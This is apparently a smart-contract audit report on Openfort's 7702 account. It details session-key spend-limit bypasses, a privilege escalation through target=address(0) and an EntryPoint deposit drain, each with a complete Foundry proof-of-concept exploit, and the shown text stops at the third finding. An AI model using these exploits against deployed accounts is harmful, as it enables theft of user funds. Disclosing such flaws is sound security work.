# Apex Report - Openfort / Openfort-Pilot

## Table of contents

- [High](#high)
  - [OPEN-2 — Token spend limits bypass via unaccounted ERC-20 allowance/transfer methods (permit/increaseAllowance/etc.)](#finding-open-2)
- [Medium](#medium)
  - [OPEN-8 — Session keys can self-call via target=address(0) to bypass validation and gain persistent key-manager control](#finding-open-8)
  - [OPEN-6 — Session key can drain ERC-4337 EntryPoint deposit via withdrawTo without native spend-limit accounting](#finding-open-6)
  - [OPEN-5 — SocialRecoveryManager.initializeGuardians is re-callable and bypasses guardian timelocks/lock, enabling guardian injection and full recovery takeover](#finding-open-5)
  - [OPEN-4 — Token spend limits bypass via allowance-based spenders (e.g., Permit2/routers): spend accounting keys off call.target, not actual token outflow](#finding-open-4)
  - [OPEN-3 — ERC-1271 accepts paused master keys (isValidSignature ignores isActive)](#finding-open-3)
  - [OPEN-1 — Session key with broad canCall can take permanent control via SocialRecoveryManager guardian injection](#finding-open-1)
- [Low](#low)
  - [OPEN-7 — Unauthenticated SocialRecoveryManager.completeRecovery enables third-party front-run to cancel and brick master-key recovery](#finding-open-7)

<a id="high"></a>
## High

<a id="finding-open-2"></a>
### OPEN-2 — Token spend limits bypass via unaccounted ERC-20 allowance/transfer methods (permit/increaseAllowance/etc.)
✅ Valid
##### Summary

The token spend limiter relies on selector‑based parsing to determine how much value a session key intends to move when interacting with ERC‑20 tokens. Only a small set of selectors (`transfer`, `transferFrom`, `approve`, and empty‑calldata native ETH transfers) are recognized. Any other selector results in a parsed spend amount of zero, yet the call is still accepted as long as a spend rule exists. This allows session keys to invoke unaccounted allowance‑ or transfer‑related token functions while consuming zero spend budget. A session key can therefore bypass configured per‑token spend limits by invoking methods such as `increaseAllowance` or custom transfer helpers, enabling attackers to authorize or directly move tokens far beyond the intended limit.

##### Details

- Explanation: The account validator examines token calls under a configured spend rule by parsing calldata and extracting a token amount. If the selector is not one of the recognized ERC‑20 methods, the parsed amount remains zero. `_manageTokenSpend` is still invoked and succeeds because adding zero to previously spent value never exceeds the limit. This permits unbounded allowance increases or token transfers through unaccounted selectors without reducing the spend limit.

- Root cause: Unknown token selectors are treated as zero-spend instead of being rejected or conservatively charged.

- Code location:  
  [`OPF7702.sol#L479`](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L479)

- Brief code snippets:

```solidity
if (fnSel == EMPTY_CALLDATA_FN_SEL) {
    tokenAmout = _value;
    _target = NATIVE_ADDRESS;
} else if (fnSel == 0xa9059cbb) {
    tokenAmout = uint256(LibBytes.load(_data, 0x24));
} else if (fnSel == 0x23b872dd) {
    tokenAmout = uint256(LibBytes.load(_data, 0x44));
} else if (fnSel == 0x095ea7b3) {
    tokenAmout = uint256(LibBytes.load(_data, 0x24));
}

if (!_manageTokenSpend(_keyId, _target, tokenAmout)) return false;
```

##### Impact

- Session keys can manipulate token allowances or invoke alternative transfer paths without consuming spend budget.
- Attackers can authorize unlimited token outflow and drain balances beyond configured per‑token limits.
- Intended security guarantees around session-key-constrained value movement no longer hold.

##### Steps to Reproduce

1. Run the Foundry test:

```bash
cd openfort-7702-account
forge test --match-path test/by-contract/POC_TokenSpendUnknownSelectorBypass_58e11602.t.sol -vvv
```

2. PoC source:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {BaseData} from "./../BaseData.t.sol";
import {GasPolicy} from "src/utils/GasPolicy.sol";
import {OPFMain as OPF7702} from "src/core/OPFMain.sol";
import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";
import {WebAuthnVerifierV2} from "src/utils/WebAuthnVerifierV2.sol";
import {EntryPoint} from "lib/account-abstraction/contracts/core/EntryPoint.sol";
import {IEntryPoint} from "lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {MessageHashUtils} from
    "lib/openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";
import {PackedUserOperation} from
    "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ERC20TransferAndCall is ERC20 {
    constructor() ERC20("ERC20TransferAndCall", "TAC") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferAndCall(address to, uint256 value, bytes calldata /*data*/ )
        external
        returns (bool)
    {
        _transfer(msg.sender, to, value);
        return true;
    }
}

contract POC_TokenSpendUnknownSelectorBypass_58e11602 is BaseData {
    ERC20TransferAndCall internal token;
    address internal attacker;

    function setUp() public {
        (owner, ownerPK) = makeAddrAndKey("owner");
        (sender, senderPK) = makeAddrAndKey("sender");
        (sessionKey, sessionKeyPK) = makeAddrAndKey("sessionKey");
        (guardian, guardianPK) = makeAddrAndKey("guardian");

        deal(owner, 10 ether);
        deal(sender, 10 ether);

        entryPoint = IEntryPoint(payable(address(new EntryPoint())));
        webAuthn = new WebAuthnVerifierV2();
        gasPolicy = new GasPolicy(DEFAULT_PVG, DEFAULT_VGL, DEFAULT_CGL, DEFAULT_PMV, DEFAULT_PO);
        recoveryManager = new SocialRecoveryManager(
            RECOVERY_PERIOD, LOCK_PERIOD, SECURITY_PERIOD, SECURITY_WINDOW
        );

        implementation = new OPF7702(
            address(entryPoint), address(webAuthn), address(gasPolicy), address(recoveryManager)
        );

        _etch();
        _createInitialGuradian();
        _createQuickFreshKey(true);
        _createQuickFreshKey(false);
        _initializeAccount();

        vm.prank(sender);
        entryPoint.depositTo{value: 1 ether}(owner);

        token = new ERC20TransferAndCall();
        attacker = makeAddr("attacker");
    }

    function test_POC_SessionKeyCanTransferMoreThanSpendLimitViaUnknownSelector() external {
        vm.warp(1_700_000_000);

        uint256 initialBalance = 10 ether;
        token.mint(owner, initialBalance);

        KeyDataReg memory eoaSessionKeyReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: uint48(block.timestamp + 365 days),
            validAfter: 0,
            limits: 10,
            key: _getKeyEOA(sessionKey),
            keyControl: KeyControl.Self
        });

        bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(sessionKey));
        uint256 spendLimit = 1 ether;

        Call[] memory setupCalls = new Call[](3);
        setupCalls[0] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.registerKey.selector, eoaSessionKeyReg)
        );
        setupCalls[1] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.setCanCall.selector, sessionKeyId, address(token), ANY_FN_SEL, true)
        );
        setupCalls[2] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setTokenSpend.selector, sessionKeyId, address(token), spendLimit, SpendPeriod.Month
            )
        );

        _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, setupCalls)));

        uint256 drain = 5 ether;

        Call[] memory attackCalls = new Call[](1);
        attackCalls[0] = _createCall(
            address(token),
            0,
            abi.encodeWithSelector(ERC20TransferAndCall.transferAndCall.selector, attacker, drain, bytes(""))
        );

        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, attackCalls)));

        assertEq(token.balanceOf(attacker), drain);
        assertEq(token.balanceOf(owner), initialBalance - drain);

        (, , uint256 spentAfter, ) = account.tokenSpend(sessionKeyId, address(token));
        assertEq(spentAfter, 0);
    }

    function _etch() internal {
        vm.etch(owner, abi.encodePacked(bytes3(0xef0100), address(implementation)));
        account = OPF7702(payable(owner));
    }

    function _initializeAccount() internal {
        bytes memory mkDataEnc = abi.encode(
            mkReg.keyType,
            mkReg.validUntil,
            mkReg.validAfter,
            mkReg.limits,
            mkReg.key,
            mkReg.keyControl
        );

        bytes memory skDataEnc = abi.encode(
            skReg.keyType,
            skReg.validUntil,
            skReg.validAfter,
            skReg.limits,
            skReg.key,
            skReg.keyControl
        );

        bytes32 structHash =
            keccak256(abi.encode(INIT_TYPEHASH, mkDataEnc, skDataEnc, _initialGuardian));

        string memory name = "OPF7702Recoverable";
        string memory version = "1";

        bytes32 domainSeparator = keccak256(
            abi.encode(TYPE_HASH, keccak256(bytes(name)), keccak256(bytes(version)), block.chainid, owner)
        );

        bytes32 digest = MessageHashUtils.toTypedDataHash(domainSeparator, structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPK, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.prank(owner);
        account.initialize(mkReg, skReg, sig, _initialGuardian);
    }

    function _relayUserOp(PackedUserOperation memory userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }

    function _userOpSignedByOwner(bytes memory callData) internal view returns (PackedUserOperation memory userOp) {
        userOp = _getFreshUserOp();
        userOp = _populateUserOpLocal(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        userOp.signature = _encodeEOASignature(_signUserOpLocal(userOp, ownerPK));
    }

    function _userOpSignedBySessionKey(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOpLocal(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        userOp.signature = _encodeEOASignature(_signUserOpLocal(userOp, sessionKeyPK));
    }

    function _populateUserOpLocal(
        PackedUserOperation memory userOp,
        bytes memory callData,
        bytes32 accountGasLimits,
        uint256 preVerificationGas,
        bytes32 gasFees,
        bytes memory paymasterAndData
    ) internal view returns (PackedUserOperation memory) {
        userOp.nonce = entryPoint.getNonce(owner, 1);
        userOp.callData = callData;
        userOp.accountGasLimits = accountGasLimits;
        userOp.preVerificationGas = preVerificationGas;
        userOp.gasFees = gasFees;
        userOp.paymasterAndData = paymasterAndData;
        return userOp;
    }

    function _signUserOpLocal(PackedUserOperation memory userOp, uint256 privateKey)
        internal
        view
        returns (bytes memory signature)
    {
        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, userOpHash);
        return abi.encodePacked(r, s, v);
    }

    function _encodeEOASignature(bytes memory signature) internal pure returns (bytes memory) {
        return abi.encode(KeyType.EOA, signature);
    }
}
```

##### Assumptions and Uncertainties

- Assumes the session key is granted permission to call the token with a selector not parsed by `_isTokenSpend`.  
- Assumes the token exposes unaccounted allowance or transfer methods (common in OZ ERC‑20s).  
- If a highly restrictive selector‑level allowlist is always used, bypass feasibility is reduced.

##### Why did tests miss this issue?

Tests focus on canonical ERC‑20 methods and do not verify behavior for unknown selectors under an active spend rule. There is no test asserting that unrecognized token calls must fail or be charged.

##### Recommendation

- Enforce deny‑by‑default: when a spend rule exists, reject token calls whose selector is not explicitly supported.  
- Alternatively, expand parsing to include common allowance/transfer methods and clearly define which selectors consume spend.  
- Avoid relying on wildcard selector permissions when spend limits are intended to constrain behavior.

##### References

1. [OPF7702.sol#L479](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L479)

<a id="medium"></a>
## Medium

<a id="finding-open-8"></a>
### OPEN-8 — Session keys can self-call via target=address(0) to bypass validation and gain persistent key-manager control
✅ Valid
##### Summary

A validation and execution mismatch allows session keys to bypass self-call restrictions and invoke privileged key‑management functions. During validation, calls are rejected only when `call.target == address(this)`; however, execution rewrites `call.target == address(0)` into `address(this)`. Because permission checks operate on the un-normalized target, a session key with broad can‑call permissions (e.g., `ANY_TARGET`) can pass validation using `target = address(0)` and subsequently execute a privileged self‑call. This enables unauthorized updates to key lifecycle state, including extending validity, refreshing limits, registering new keys, and modifying or revoking other session keys. As a result, a non-master session key can escalate privileges, achieve persistent access, and undermine the intended expiry and quota constraints governing session‑key behavior.

##### Details

- Explanation: Validation checks only the raw `call.target`, rejecting self‑calls solely when equal to `address(this)`. Execution later rewrites `address(0)` to `address(this)` before performing the call. Wildcard permissions allow validation to succeed on `address(0)`, enabling the call to execute as a privileged self‑call that passes `_requireForExecute`.
- Root cause: Inconsistent normalization of `call.target` between validation and execution.
- Code location: see linked references.
- Relevant snippets:

```solidity
// Execution._run
address to = c.target == address(0) ? address(this) : c.target;
```

```solidity
// OPF7702._validateCall
if (call.target == address(this)) return false;
if (!_isCanCall(keyId, call.target, call.data)) return false;
```

```solidity
// BaseOPF7702._requireForExecute
require(msg.sender == address(this) || msg.sender == address(entryPoint()));
```

##### Impact

- Unauthorized extension of session‑key validity and expansion of limits
- Registration of attacker‑controlled keys, creating persistent backdoors
- Modification or revocation of other session keys
- Effective takeover of key‑management functionality without master‑key access

##### Steps to Reproduce

1) Run the PoC test (requires a Sepolia RPC URL for the fork used by the existing harness):

   ```bash
   cd openfort-7702-account
   SEPOLIA_RPC_URL=https://ethereum-sepolia.publicnode.com forge test --match-path test/by-contract/POC_SessionKeyZeroTargetBypass_87bd9d8b.t.sol -vvv
   ```

2) Observe that the session key’s `validUntil` and `limits` are mutated by a user operation signed by the session key, even though session keys are intended to be unable to self-call.

3) PoC source:

   ```solidity
   // SPDX-License-Identifier: MIT
   pragma solidity 0.8.29;

   import {Deploy} from "./../Deploy.t.sol";
   import {PackedUserOperation} from
       "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";

   /**
    * @title POC: Session Key Self-Call Bypass via target=address(0)
    * @notice Proof Statement: Prove that a session key with `ANY_TARGET` can pass `_validateCall` using
    *         `Call.target = address(0)` (not treated as a self-call during validation), yet execution
    *         rewrites `address(0)` to `address(this)` and performs a privileged self-call, allowing the
    *         session key to mutate key lifecycle state (e.g., extend validity and refresh limits).
    *
    * Bug Vector:
    * 1) Owner registers an EOA session key with a small quota, and grants `(ANY_TARGET, ANY_FN_SEL)`.
    * 2) The session key submits `execute(mode_1, ...)` with a single inner Call where `target=address(0)`
    *    and `data=updateKeyData(sessionKeyId, newValidUntil, newLimits)`.
    * 3) Validation checks permissions against `_target=address(0)` and does not classify it as a self-call.
    * 4) Execution rewrites `target=address(0)` to `address(this)`, so `updateKeyData` runs as a self-call
    *    and passes `_requireForExecute()`, mutating key lifecycle state.
    */
   contract POC_SessionKeyZeroTargetBypass_87bd9d8b is Deploy {
       function setUp() public override {
           super.setUp();
           _quickInitializeAccount();
           _initializeAccount();
       }

       function test_POC_SessionKeyCanMutateKeyLifecycleViaZeroTarget() external {
           // --- Setup: owner registers an EOA session key and grants ANY_TARGET permissions.
           KeyDataReg memory eoaSessionKeyReg = KeyDataReg({
               keyType: KeyType.EOA,
               validUntil: uint48(block.timestamp + 1 days),
               validAfter: 0,
               limits: 1,
               key: _getKeyEOA(sessionKey),
               keyControl: KeyControl.Self
           });

           bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(sessionKey));

           Call[] memory setupCalls = new Call[](2);
           setupCalls[0] =
               _createCall(address(account), 0, abi.encodeWithSelector(account.registerKey.selector, eoaSessionKeyReg));
           setupCalls[1] = _createCall(
               address(account),
               0,
               abi.encodeWithSelector(account.setCanCall.selector, sessionKeyId, ANY_TARGET, ANY_FN_SEL, true)
           );

           _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, setupCalls)));

           KeyData memory beforeKey = account.getKey(sessionKeyId);
           assertTrue(beforeKey.isActive);
           assertFalse(beforeKey.masterKey);
           assertEq(beforeKey.limits, 1);

           // --- Attack: session key uses target=address(0) to execute a privileged self-call.
           uint48 newValidUntil = uint48(block.timestamp + 365 days);
           uint48 newLimits = 100;

           Call[] memory attackCalls = new Call[](1);
           attackCalls[0] = _createCall(
               address(0),
               0,
               abi.encodeWithSelector(account.updateKeyData.selector, sessionKeyId, newValidUntil, newLimits)
           );

           _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, attackCalls)));

           KeyData memory afterKey = account.getKey(sessionKeyId);
           assertEq(afterKey.validUntil, newValidUntil);
           assertEq(afterKey.limits, newLimits);
       }

       function _relayUserOp(PackedUserOperation memory userOp) internal {
           PackedUserOperation[] memory ops = new PackedUserOperation[](1);
           ops[0] = userOp;

           _etch();
           vm.prank(sender);
           entryPoint.handleOps(ops, payable(sender));
       }

       function _userOpSignedByOwner(bytes memory callData) internal view returns (PackedUserOperation memory userOp) {
           userOp = _getFreshUserOp();
           userOp = _populateUserOp(
               userOp,
               callData,
               _packAccountGasLimits(1_000_000, 1_000_000),
               1_000_000,
               _packGasFees(80 gwei, 15 gwei),
               hex""
           );

           bytes memory signature = _signUserOp(userOp);
           userOp.signature = _encodeEOASignature(signature);
       }

       function _userOpSignedBySessionKey(bytes memory callData)
           internal
           view
           returns (PackedUserOperation memory userOp)
       {
           userOp = _getFreshUserOp();
           userOp = _populateUserOp(
               userOp,
               callData,
               _packAccountGasLimits(1_000_000, 1_000_000),
               1_000_000,
               _packGasFees(80 gwei, 15 gwei),
               hex""
           );

           bytes memory signature = _signUserOp(userOp, sessionKeyPK);
           userOp.signature = _encodeEOASignature(signature);
       }
   }
   ```

##### Assumptions and Uncertainties

- Exploitation requires a session key whose can‑call permissions match `address(0)`, typically via `ANY_TARGET`. If no such permissions are ever granted, exploitability decreases.
- Attacker must possess any active non‑master session key.
- Assumes no other validation step normalizes `address(0)`; if introduced, the vulnerability would be mitigated.

##### Why did tests miss this issue?

Tests focus on rejecting explicit self‑calls (`target == address(this)`) and do not cover the sentinel behavior where execution rewrites `address(0)` into `address(this)`. Consequently, they never evaluate the mismatch between validation and execution.

##### Recommendation

- Normalize `call.target` during validation exactly as in execution, treating `address(0)` as `address(this)` before self‑call checks and permission evaluation.
- Alternatively, explicitly forbid `call.target == address(0)` for session‑key calls or require a dedicated permission for self‑calls.

##### References

1. [Execution.sol#L108-L112](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/Execution.sol#L108-L112)  
2. [OPF7702.sol#L394-L414](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L394-L414)  
3. [BaseOPF7702.sol#L193-L198](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/BaseOPF7702.sol#L193-L198)  
4. [KeysManagerLib.sol#L94-L97](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/libs/KeysManagerLib.sol#L94-L97)

<a id="finding-open-6"></a>
### OPEN-6 — Session key can drain ERC-4337 EntryPoint deposit via withdrawTo without native spend-limit accounting
✅ Valid
##### Summary

A session key permitted to call `EntryPoint.withdrawTo(address,uint256)` can drain the account’s entire ERC‑4337 EntryPoint deposit without triggering native ETH spend-limit accounting. The validation logic interprets native spend exclusively as `call.value > 0`, while EntryPoint-managed deposits are withdrawn via internal accounting with `call.value == 0`. Because spend enforcement for non‑native buckets relies on selector-based parsing that does not decode `withdrawTo`, the withdrawn amount is never charged against any spend rule. As a result, an attacker with a compromised session key can transfer all deposit-held ETH to an arbitrary address, bypassing the configured native ETH limits and rendering the account unable to fund future UserOperations.

##### Details

- Explanation:  
  The vulnerable path hinges on the spend-bucket selection in `_validateCall`. When `call.value == 0`, the system assigns the spend bucket to `call.target` instead of `NATIVE_ADDRESS`. ERC‑4337 withdrawals occur via `StakeManager.withdrawTo`, which moves ETH from the EntryPoint’s internal deposit without requiring a payable call. Because `_isTokenSpend` only parses a small set of ERC‑20 selectors or empty calldata for ETH transfers, the `withdrawTo` amount is ignored. Consequently, spend limits do not capture or restrict ETH leaving via the deposit withdrawal path.

- Root cause:  
  Native ETH spend is tied to `call.value > 0`, and the spend parser does not detect ETH outflows initiated via EntryPoint-managed internal deposit accounting.

- Code location:  
  [OPF7702.sol#L394-L414](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/src/core/OPF7702.sol#L394-L414)  
  [StakeManager.sol#L136-L148](https://github.com/openfort-xyz/openfort-7702-account/blob/16835186069e6299a31977490b7d9244ebb1f371/lib/account-abstraction/contracts/core/StakeManager.sol#L136-L148)

- Brief code snippets:

```solidity
// Spend bucket selection
address token = call.value > 0 ? NATIVE_ADDRESS : call.target;
```

```solidity
// ERC-4337 deposit withdrawal
(bool success,) = withdrawAddress.call{value: withdrawAmount}("");
```

##### Impact

- Direct theft of all ETH stored in the account’s EntryPoint deposit  
- Session key ETH spend limits become ineffective for major outflow paths  
- Loss of operational continuity: the account cannot fund future UserOperations

##### Steps to Reproduce 
1. From repo root, run the PoC test:

```bash
cd openfort-7702-account
forge test --match-path test/by-contract/POC_EntryPointDepositWithdrawSpendLimitBypass_e2c3bbf0.t.sol
```

2. The PoC source (included verbatim):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {BaseData} from "./../BaseData.t.sol";
import {GasPolicy} from "src/utils/GasPolicy.sol";
import {OPFMain as OPF7702} from "src/core/OPFMain.sol";
import {SocialRecoveryManager} from "src/utils/SocialRecover.sol";
import {WebAuthnVerifierV2} from "src/utils/WebAuthnVerifierV2.sol";
import {EntryPoint} from "lib/account-abstraction/contracts/core/EntryPoint.sol";
import {IEntryPoint} from "lib/account-abstraction/contracts/interfaces/IEntryPoint.sol";
import {IStakeManager} from "lib/account-abstraction/contracts/interfaces/IStakeManager.sol";
import {MessageHashUtils} from
    "lib/openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";
import {PackedUserOperation} from
    "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";

/**
 * @title POC: Session key drains EntryPoint deposit via `withdrawTo` without native spend-limit accounting
 * @notice Proof Statement: Prove that a session key with permission to call `EntryPoint.withdrawTo(address,uint256)`
 *         can withdraw the account's entire ERC-4337 deposit to an attacker without decrementing (or checking)
 *         the configured native ETH spend limit, because validation ties "native ETH spend" to `call.value > 0`
 *         while `withdrawTo` transfers ETH from the EntryPoint-managed deposit with `call.value == 0`.
 *
 * Bug Vector:
 * 1) Fund the account's EntryPoint deposit via `depositTo(account)`.
 * 2) Register a session key with:
 *    - `canCall(entryPoint, withdrawTo)`
 *    - a strict native spend limit on `NATIVE_ADDRESS`
 *    - (optional) a strict spend rule for `entryPoint` so the spend-limiter path is exercised
 * 3) Session key executes a call to `EntryPoint.withdrawTo(attacker, amount)` with `call.value == 0`.
 * 4) Deposit decreases and attacker receives ETH, while native spend accounting remains unchanged.
 */
contract POC_EntryPointDepositWithdrawSpendLimitBypass_e2c3bbf0 is BaseData {
    address payable internal attacker;

    function setUp() public {
        (owner, ownerPK) = makeAddrAndKey("owner");
        (sender, senderPK) = makeAddrAndKey("sender");
        (sessionKey, sessionKeyPK) = makeAddrAndKey("sessionKey");
        (guardian, guardianPK) = makeAddrAndKey("guardian");

        _deal();

        entryPoint = IEntryPoint(payable(address(new EntryPoint())));
        webAuthn = new WebAuthnVerifierV2();
        gasPolicy = new GasPolicy(DEFAULT_PVG, DEFAULT_VGL, DEFAULT_CGL, DEFAULT_PMV, DEFAULT_PO);
        recoveryManager = new SocialRecoveryManager(
            RECOVERY_PERIOD, LOCK_PERIOD, SECURITY_PERIOD, SECURITY_WINDOW
        );

        implementation = new OPF7702(
            address(entryPoint), address(webAuthn), address(gasPolicy), address(recoveryManager)
        );

        _etch();
        _createInitialGuradian();
        _createQuickFreshKey(true);
        _createQuickFreshKey(false);
        _initializeAccount();

        attacker = payable(makeAddr("attacker"));

        vm.prank(sender);
        entryPoint.depositTo{value: 10 ether}(owner);
    }

    function test_POC_SessionKeyDrainsEntryPointDepositWithoutNativeSpendAccounting() external {
        // Use a non-zero timestamp so month-period rounding produces `current > 0` during `_manageTokenSpend`.
        vm.warp(1_700_000_000);

        // --- Setup: register an EOA session key and configure permissions + spend caps.
        KeyDataReg memory eoaSessionKeyReg = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: uint48(block.timestamp + 365 days),
            validAfter: 0,
            limits: 10,
            key: _getKeyEOA(sessionKey),
            keyControl: KeyControl.Self
        });

        bytes32 sessionKeyId = _computeKeyId(KeyType.EOA, _getKeyEOA(sessionKey));
        uint256 nativeSpendLimit = 1 ether;

        Call[] memory setupCalls = new Call[](4);
        setupCalls[0] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(account.registerKey.selector, eoaSessionKeyReg)
        );
        setupCalls[1] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setCanCall.selector,
                sessionKeyId,
                address(entryPoint),
                IStakeManager.withdrawTo.selector,
                true
            )
        );
        setupCalls[2] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setTokenSpend.selector,
                sessionKeyId,
                NATIVE_ADDRESS,
                nativeSpendLimit,
                SpendPeriod.Month
            )
        );
        // Ensure the spend-limiter path is exercised for `call.value == 0` calls (token bucket = call.target).
        setupCalls[3] = _createCall(
            address(account),
            0,
            abi.encodeWithSelector(
                account.setTokenSpend.selector,
                sessionKeyId,
                address(entryPoint),
                1 wei,
                SpendPeriod.Month
            )
        );

        _relayUserOp(_userOpSignedByOwner(_packCallData(mode_1, setupCalls)));

        // --- Attack: withdraw more ETH than the native spend limit, but from the EntryPoint deposit (call.value == 0).
        uint256 drain = 5 ether;
        assertTrue(drain > nativeSpendLimit);

        uint256 depositBefore = IStakeManager(address(entryPoint)).balanceOf(owner);
        assertTrue(depositBefore >= drain, "insufficient EntryPoint deposit for drain amount");
        uint256 attackerBalBefore = attacker.balance;

        Call[] memory attackCalls = new Call[](1);
        attackCalls[0] = _createCall(
            address(entryPoint),
            0,
            abi.encodeWithSelector(IStakeManager.withdrawTo.selector, attacker, drain)
        );

        _relayUserOp(_userOpSignedBySessionKey(_packCallData(mode_1, attackCalls)));

        // --- Proof: deposit decreased (by at least `drain`, plus gas reimbursement) and attacker received ETH.
        uint256 depositAfter = IStakeManager(address(entryPoint)).balanceOf(owner);
        assertTrue(depositBefore - depositAfter >= drain, "deposit decrease should cover withdraw amount");
        assertEq(attacker.balance, attackerBalBefore + drain);

        // --- Proof: native spend accounting remains unchanged (not checked/decremented).
        (, uint256 nativeLimit, uint256 nativeSpentAfter, uint256 nativeLastUpdatedAfter) =
            account.tokenSpend(sessionKeyId, NATIVE_ADDRESS);
        assertEq(nativeLimit, nativeSpendLimit);
        assertEq(nativeSpentAfter, 0, "native spent should remain 0 (withdrawTo uses call.value == 0)");
        assertEq(nativeLastUpdatedAfter, 0, "native spend period should not be initialized");
    }

    function _etch() internal {
        vm.etch(owner, abi.encodePacked(bytes3(0xef0100), address(implementation)));
        account = OPF7702(payable(owner));
    }

    function _initializeAccount() internal {
        bytes memory mkDataEnc = abi.encode(
            mkReg.keyType,
            mkReg.validUntil,
            mkReg.validAfter,
            mkReg.limits,
            mkReg.key,
            mkReg.keyControl
        );

        bytes memory skDataEnc = abi.encode(
            skReg.keyType,
            skReg.validUntil,
            skReg.validAfter,
            skReg.limits,
            skReg.key,
            skReg.keyControl
        );

        bytes32 structHash =
            keccak256(abi.encode(INIT_TYPEHASH, mkDataEnc, skDataEnc, _initialGuardian));

        string memory name = "OPF7702Recoverable";
        string memory version = "1";

        bytes32 domainSeparator = keccak256(
            abi.encode(
                TYPE_HASH, keccak256(bytes(name)), keccak256(bytes(version)), block.chainid, owner
            )
        );

        bytes32 digest = MessageHashUtils.toTypedDataHash(domainSeparator, structHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPK, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.prank(owner);
        account.initialize(mkReg, skReg, sig, _initialGuardian);
    }

    function _relayUserOp(PackedUserOperation memory userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }

    function _userOpSignedByOwner(bytes memory callData) internal view returns (PackedUserOperation memory userOp) {
        userOp = _getFreshUserOp();
        userOp = _populateUserOpLocal(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        userOp.signature = _encodeEOASignature(_signUserOpLocal(userOp, ownerPK));
    }

    function _userOpSignedBySessionKey(bytes memory callData)
        internal
        view
        returns (PackedUserOperation memory userOp)
    {
        userOp = _getFreshUserOp();
        userOp = _populateUserOpLocal(
            userOp,
            callData,
            _packAccountGasLimits(1_000_000, 1_000_000),
            1_000_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        userOp.signature = _encodeEOASignature(_signUserOpLocal(userOp, sessionKeyPK));
    }

    function _populateUserOpLocal(
        PackedUserOperation memory userOp,
        bytes memory callData,
        bytes32 accountGasLimits,
        uint256 preVerificationGas,
        bytes32 gasFees,
        bytes memory paymasterAndData
    ) internal view returns (PackedUserOperation memory) {
        userOp.nonce = entryPoint.getNonce(owner, 1);
        userOp.callData = callData;
        userOp.accountGasLimits = accountGasLimits;
        userOp.preVerificationGas = preVerificationGas;
        userOp.gasFees = gasFees;
        userOp.paymasterAndData = paymasterAndData;
        return userOp;
    }

    function _signUserOpLocal(PackedUserOperation memory userOp, uint256 privateKey)
        internal
        view
        returns (bytes memory signature)
    {
        bytes32 userOpHash = entryPoint.getUserOpHash(userOp);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, userOpHash);
        return abi.encodePacked(r, s, v);
    }

    function _encodeEOASignature(bytes memory signature) internal pure returns (bytes memory) {
        return abi.encode(KeyType.EOA, signature);
    }
}

```

##### Assumptions and Uncertainties

- The account maintains a non‑zero EntryPoint deposit; if false, no ETH can be withdrawn.  
- The session key is permitted to call `withdrawTo`; if this permission is removed or denylisted, the issue is mitigated.  
- No alternative policy restricts EntryPoint withdrawal functions; if present, such a mechanism could block the attack path.

##### Why did tests miss this issue?

